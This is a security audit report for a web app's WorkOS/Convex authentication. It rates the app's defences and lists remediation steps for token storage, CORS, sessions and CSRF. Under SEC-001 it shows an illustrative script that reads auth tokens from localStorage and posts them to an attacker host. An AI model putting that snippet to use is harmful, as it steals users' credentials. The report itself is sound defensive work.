# Security Assessment

**Sprint**: 03 of 07
**Index**: AUTH_REMEDIATION_INDEX
**Depends On**: Sprint 01
**Next**: AUTH_REMEDIATION_SPRINT_04_TESTING

---

## Security Score: 7/10

**Summary**: Strong authentication architecture with proper CSRF protection and JWT validation, but localStorage token storage creates XSS vulnerability and CORS is overly permissive.

## Vulnerability Matrix

| ID | Issue | Severity | Status | Location |
|----|-------|----------|--------|----------|
| SEC-001 | XSS Token Exposure | 🔴 Critical | OPEN | localStorage usage |
| SEC-002 | CORS Wildcard | 🟡 Medium | OPEN | http.ts:230 |
| SEC-003 | No Session Limit | 🟡 Medium | OPEN | No implementation |
| SEC-004 | Logout Fallback | 🟢 Low | OPEN | http.ts:89-92 |

---

## SEC-001: XSS Token Exposure (CRITICAL)

**Risk**: Any XSS vulnerability allows attackers to steal all auth tokens.

**Evidence**:
```typescript
// src/lib/workos-auth.tsx:267
localStorage.setItem(STORAGE_KEYS[role], JSON.stringify(storageData));
```

**Attack Vector**:
```javascript
// Any injected script can steal tokens
const tokens = localStorage.getItem('workos_admin_auth');
fetch('https://attacker.com/steal', { method: 'POST', body: tokens });
```

**Why localStorage**: Convex SDK requires frontend access to tokens for real-time subscriptions.

**Remediation Options**:
1. **Preferred**: Move to httpOnly cookies (requires backend changes)
2. **Alternative**: Implement strict CSP headers
3. **Minimum**: Add token encryption at rest

**CSP Header Example**:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

---

## SEC-002: CORS Wildcard (MEDIUM)

**Risk**: Any website can call `/auth/refresh` endpoint with stolen refresh token.

**Evidence**:
```typescript
// convex/http.ts:229-233
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",  // ❌ WILDCARD
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};
```

**Affected Endpoint**: `/auth/refresh` only (lines 238-284)

**Remediation**:
```typescript
const corsHeaders = {
  "Access-Control-Allow-Origin": process.env.APP_URL || "http://localhost:5175",
  "Access-Control-Allow-Credentials": "true",
  // ...
};
```

---

## SEC-003: No Concurrent Session Limit (MEDIUM)

**Risk**: Stolen tokens remain valid even after user logs in elsewhere.

**Current State**: Unlimited concurrent sessions allowed.

**Remediation**:
1. Track active sessions in database
2. Add "logout all sessions" feature
3. Implement session limit policy (e.g., max 5 sessions)

---

## Security Strengths ✅

### CSRF Protection (STRONG)

```typescript
// convex/http.ts:37
const state = crypto.randomUUID();  // 122-bit entropy

// convex/http.ts:40
expiresAt: Date.now() + 5 * 60 * 1000,  // 5-minute TTL

// convex/http.ts:129
await ctx.runMutation(internal.oauthState.deleteState, { state });  // One-time use
```

**Protection Level**: ✅ Excellent - UUID + TTL + single-use deletion

### JWT Validation (STRONG)

```typescript
// convex/auth.config.ts
providers: [
  {
    type: "customJwt",
    issuer: "https://api.workos.com/",
    algorithm: "RS256",          // Asymmetric
    jwks: `https://api.workos.com/sso/jwks/${clientId}`,  // Key rotation
  },
]
```

**Protection Level**: ✅ Excellent - RS256 + JWKS + Convex auto-verification

### Secret Protection (STRONG)

| Variable | Location | Exposure |
|----------|----------|----------|
| `WORKOS_API_KEY` | Backend only | ✅ Protected |
| `WORKOS_CLIENT_ID` | Backend only | ✅ Protected |
| `VITE_*` vars | Frontend | ✅ OK (public) |

**Verification**: Grep confirmed no secrets in frontend code.

### Input Validation (ADEQUATE)

- Required field validation in AdminAuthCallback
- GDPR consent validation in EmployerRegistrationForm
- Convex parameterized queries prevent SQL injection
- React JSX auto-escapes content (implicit XSS protection)

**Missing**: No explicit DOMPurify/sanitization library

---

## Open Redirect Check: PASSED ✅

```typescript
// convex/http.ts - Only internal paths used
let redirectPath = "/register/choose-role";  // Always starts with /
if (employer) redirectPath = "/employer";
else if (doctor) redirectPath = "/doctor";
else if (adminUser) redirectPath = "/admin";
```

**No user-controlled redirect URLs accepted.**

---

## Session Fixation Check: PASSED ✅

- Session ID generated server-side by WorkOS
- State parameter validates OAuth flow integrity
- Session ID extracted from JWT (not user-controllable)

---

## Security Remediation Priorities

### Phase 1: Critical (Week 1)
1. Add CSP headers to prevent XSS exploitation
2. Restrict CORS to APP_URL

### Phase 2: Medium (Week 2-3)
3. Implement session tracking and limits
4. Add "logout all sessions" feature

### Phase 3: Hardening (Week 4+)
5. Add rate limiting on /auth/refresh
6. Consider httpOnly cookie migration
7. Add explicit input sanitization

---

→ Next: AUTH_REMEDIATION_SPRINT_04_TESTING
